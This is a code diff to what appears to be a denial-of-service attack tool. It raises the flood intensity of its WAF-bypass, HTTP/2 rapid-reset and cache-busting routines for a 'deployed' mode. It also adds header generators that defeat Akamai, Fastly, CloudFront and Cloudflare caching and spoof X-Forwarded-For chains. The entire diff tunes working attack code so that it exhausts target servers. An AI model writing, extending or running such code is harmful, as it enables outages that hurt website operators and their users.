@@ -2777,13 +2777,13 @@ async function runWAFBypass(
   // Per-worker concurrent connection caps:
   //   Dev: capped at 50/40/30/20/20 — fits comfortably in 64MB
   //   Deployed: full multipliers (2000/1500/900/600/400)
-  const NUM_PRIMARY = IS_DEPLOYED ? Math.min(primaryT * 6, 2000) : Math.min(primaryT * 2, 50);
-  const NUM_SUBRES  = IS_DEPLOYED ? Math.min(subresT  * 5, 1500) : Math.min(subresT  * 2, 40);
-  const NUM_CACHE   = IS_DEPLOYED ? Math.min(cacheT   * 4,  900) : Math.min(cacheT   * 2, 30);
-  const NUM_SESSION = IS_DEPLOYED ? Math.min(sessionT * 3,  600) : Math.min(sessionT * 2, 20);
-  const NUM_DRAIN   = IS_DEPLOYED ? Math.min(drainT   * 4,  400) : Math.min(drainT   * 2, 20);
+  const NUM_PRIMARY = IS_DEPLOYED ? Math.min(primaryT * 9, 3500) : Math.min(primaryT * 2, 50);
+  const NUM_SUBRES  = IS_DEPLOYED ? Math.min(subresT  * 7, 2500) : Math.min(subresT  * 2, 40);
+  const NUM_CACHE   = IS_DEPLOYED ? Math.min(cacheT   * 6, 1400) : Math.min(cacheT   * 2, 30);
+  const NUM_SESSION = IS_DEPLOYED ? Math.min(sessionT * 5,  900) : Math.min(sessionT * 2, 20);
+  const NUM_DRAIN   = IS_DEPLOYED ? Math.min(drainT   * 6,  600) : Math.min(drainT   * 2, 20);
   const STREAMS_PER = IS_DEPLOYED
-    ? Math.min(512, Math.max(64, primaryT * 3))
+    ? Math.min(900, Math.max(128, primaryT * 5))
     : Math.min(64,  Math.max(16, primaryT));
 
   let localPkts = 0, localBytes = 0, wPIdx = 0;
@@ -3451,10 +3451,10 @@ async function runH2RstBurst(
   const target   = `https://${resolvedIp}:${port}`;
   // Deployed: higher limits → more RST pairs before reconnect → server allocates/frees more state
   const RST_PER_CONN = IS_DEPLOYED
-    ? Math.min(threads * 16, 8000)    // 8K RST pairs per conn (deployed — 32GB RAM)
+    ? Math.min(threads * 28, 20000)   // 20K RST pairs per conn (deployed — max H2 stream pressure)
     : Math.min(threads * 8, 500);     // 500 RST pairs per conn (dev — conservative)
   const INFLIGHT = IS_DEPLOYED
-    ? Math.min(threads * 8, 2000)     // 2K in-flight streams (deployed)
+    ? Math.min(threads * 14, 6000)    // 6K in-flight streams (deployed — fills server H2 table)
     : Math.min(threads * 4, 200);     // 200 in-flight streams (dev)
 
   let localPkts = 0, localBytes = 0, pIdx = 0;
@@ -3530,7 +3530,7 @@ async function runH2RstBurst(
 
   // Deployed: more concurrent connection slots → more parallel RST streams
   const concurrency = IS_DEPLOYED
-    ? Math.min(Math.max(4, Math.floor(threads / 20)), 200)  // up to 200 slots deployed
+    ? Math.min(Math.max(4, Math.floor(threads / 12)), 400)  // up to 400 slots deployed
     : Math.min(Math.max(2, Math.floor(threads / 50)), 8);   // up to 8 slots dev
   await Promise.all(Array.from({ length: concurrency }, () => runSlot()));
   clearInterval(flushIv); flush();
@@ -4898,8 +4898,8 @@ async function runCachePoison(
   onStats: (p: number, b: number) => void,
   proxies: ProxyConfig[] = [],
 ): Promise<void> {
-  // Deployed (32GB): 3000 CDN-busting slots; non-deployed: 1500; dev: 80
-  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 80) : IS_DEPLOYED ? Math.min(threads, 3000) : Math.min(threads, 1500);
+  // Deployed (32GB): 6000 CDN-busting slots; non-deployed: 1500; dev: 80
+  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 80) : IS_DEPLOYED ? Math.min(threads, 6000) : Math.min(threads, 1500);
 
   const rand    = (n: number) => Math.random() * n | 0;
   const rHex    = (n: number) => Array.from({ length: n }, () => (rand(16)).toString(16)).join("");
@@ -4923,6 +4923,18 @@ async function runCachePoison(
     () => ({ "Next-Router-State-Tree": `%5B%22${rHex(16)}%22%2C%22${rHex(8)}%22%5D` }),
     // Cloudflare workers / edge cache segmentation via device type
     () => ({ "CF-Device-Type": ["desktop","mobile","tablet"][rand(3)], "Save-Data": rand(2) ? "on" : "off" }),
+    // Akamai Edge Cache segmentation — unique Akamai-specific headers create distinct cache objects
+    () => ({ "Akamai-Origin-Hop": `${rand(10)}`, "X-Akamai-Request-ID": rHex(20), "X-Check-Cacheable": "YES" }),
+    // Fastly Surrogate-Key invalidation — unique key per request forces separate cache lookup
+    () => ({ "Surrogate-Key": `${rHex(8)} ${rHex(6)} ${rHex(4)}`, "Surrogate-Control": `max-age=${rand(3600)}` }),
+    // Vary header abuse — forces CDN to store separate copies per Accept-Language variant
+    () => ({ "Accept-Language": `${["pt-BR","en-US","es-ES","fr-FR","de-DE"][rand(5)]};q=${(Math.random()).toFixed(2)}`, "Vary": "Accept-Language,Accept-Encoding" }),
+    // AWS CloudFront cache miss via unique viewer-country header
+    () => ({ "CloudFront-Viewer-Country": ["BR","US","DE","JP","FR","IN","RU"][rand(7)], "CloudFront-Forwarded-Proto": rand(2) ? "https" : "http" }),
+    // X-Forwarded-For with multiple hops — distinct cache key per unique proxy chain
+    () => ({ "X-Forwarded-For": `${rIP()}, ${rIP()}, ${rIP()}`, "Forwarded": `for=${rIP()};proto=https;by=${rIP()}` }),
+    // Cache-Control directives that force unique CDN evaluation per variation
+    () => ({ "Cache-Control": `no-cache, max-age=${rand(0)}, s-maxage=${rand(0)}, stale-while-revalidate=${rand(60)}` }),
   ];
   const PATHS = [
     "/", "/?v=", "/?_=", "/?cache=", "/?r=", "/?id=", "/?t=", "/?bust=", "/?debug=", "/?ref=", "/?ts=", "/?q=",
